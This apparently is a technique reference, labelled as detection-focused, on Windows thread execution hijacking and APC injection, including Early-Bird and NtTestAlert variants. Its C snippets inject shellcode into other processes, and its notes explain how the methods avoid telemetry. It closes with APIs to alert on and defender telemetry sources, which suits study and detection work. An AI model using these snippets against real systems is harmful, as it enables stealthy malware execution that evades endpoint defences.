---
name: thread-hijacking-injection
description: Thread execution hijacking + APC queueing -- running shellcode in an existing thread's context via SuspendThread/SetContext or QueueUserAPC on alertable waits. Detection focus.
---

# Thread Execution Hijacking and APC Injection

Two closely related techniques that avoid `CreateRemoteThread` and the ETW telemetry it generates.
Both reuse an **existing** thread of a target process instead of creating a new one.

## 1. Thread Execution Hijacking

### Procedure

1. `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)` -- enumerate every thread on the system.
2. `Thread32First` / `Thread32Next` -- filter by `th32OwnerProcessID == target_pid`.
3. `OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | ..., ...)`.
4. `SuspendThread(hThread)`.
5. Allocate RWX in the target with `VirtualAllocEx`, write shellcode with `WriteProcessMemory`.
6. `GetThreadContext(hThread, &ctx)`.
7. Rewrite `ctx.Rip` (x64) or `ctx.Eip` (x86) to point at the shellcode.
8. `SetThreadContext(hThread, &ctx)`.
9. `ResumeThread(hThread)` -- shellcode runs with the target thread's identity.

Classic skeleton (loop over threads, filter, hijack one):

```c
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te{ sizeof(te) };
if (Thread32First(hSnapshot, &te)) {
    do {
        if (te.th32OwnerProcessID != targetPid) continue;
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
        /* inject payload here, rewrite context */
        CloseHandle(hThread);
    } while (Thread32Next(hSnapshot, &te));
}
CloseHandle(hSnapshot);
```

### Pros / Cons

- **Pro**: no new thread, no `CreateRemoteThread` telemetry.
- **Pro**: shellcode inherits the thread's token, TLS, impersonation state.
- **Con**: hijacking a thread mid-work corrupts whatever it was doing -- target process may crash
  once your payload returns to the hijacked RIP.
- **Con**: `SuspendThread` + `SetThreadContext` combo is itself a well-known IOC.

## 2. APC Injection

Asynchronous Procedure Calls (APCs) are per-thread work items the OS drains when a thread enters
an **alertable wait** -- any of `SleepEx`, `SignalObjectAndWait`, `MsgWaitForMultipleObjectsEx`,
`WaitForMultipleObjectsEx`, `WaitForSingleObjectEx` with `bAlertable = TRUE`.

### Procedure

1. Enumerate target process threads (same as hijacking).
2. `OpenThread(THREAD_SET_CONTEXT | ..., ...)` on each candidate.
3. `VirtualAllocEx` + `WriteProcessMemory` to drop shellcode.
4. `QueueUserAPC((PAPCFUNC)shellcode, hThread, arg)` for each -- queued but not fired.
5. Wait: the next time any of these threads enters an alertable wait, the kernel drains the queue
   and runs the shellcode.

```c
LPVOID remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, remote, shellcode, size, NULL);

for (DWORD tid : threadIds) {
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, tid);
    QueueUserAPC((PAPCFUNC)remote, hThread, 0);
    CloseHandle(hThread);
}
```

### Early-Bird APC Variant

Target: a **newly created** process in suspended state. The initial thread hasn't started yet;
queue the APC against it, then `ResumeThread`. The APC fires before the loader even calls
`DllMain` for ntdll -- shellcode runs essentially pre-entrypoint.

```c
STARTUPINFO si{ sizeof(si) };
PROCESS_INFORMATION pi{};
CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);
/* allocate + write shellcode in pi.hProcess as above */
QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
ResumeThread(pi.hThread);
```

Microsoft Defender ATP + many EDRs specifically watch for `CREATE_SUSPENDED` + remote write +
`QueueUserAPC` on the primary thread -- that combination is near-pathognomonic.

### NtTestAlert Trick

`NtTestAlert` manually drains the APC queue of the calling thread even if it isn't waiting
alertably. For self-injection, this guarantees the queued APC fires on the next instruction.

```c
QueueUserAPC(payload, GetCurrentThread(), 0);
LI_FN(NtTestAlert)();   // forces drain
```

Useful in combination with `NtMapViewOfSection` self-injection chains.

## Featured APIs Worth Alerting On

Red-team toolkit minimum:

```
VirtualAllocEx       WriteProcessMemory      NtTestAlert
VirtualAlloc         CreateProcessA/W        NtCreateSection
NtMapViewOfSection   NtUnmapViewOfSection    OpenThread
MapViewOfSection     QueueUserAPC            ResumeThread
OpenProcess          Process32First/Next     CreateToolhelp32Snapshot
Thread32First/Next   SuspendThread            SetThreadContext/GetThreadContext
```

Any production code that calls `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)` followed by `OpenThread`
+ `QueueUserAPC` or `SetThreadContext` on a non-owned PID should trip EDR behavioural rules.

## Defender Angles

- ETW `Microsoft-Windows-Threat-Intelligence::NtQueueApcThreadEx` records every APC queued across
  processes.
- `PsSetCreateThreadNotifyRoutine` + context inspection catches `CREATE_SUSPENDED` + context-rewrite
  on initial thread (early-bird).
- `ThreadNotifyRoutine` can observe `SetThreadContext` from another process into this one.
- Behavioural: any process that enumerates all threads of another process in a tight loop is a
  massive flag; legitimate code targets specific thread IDs.
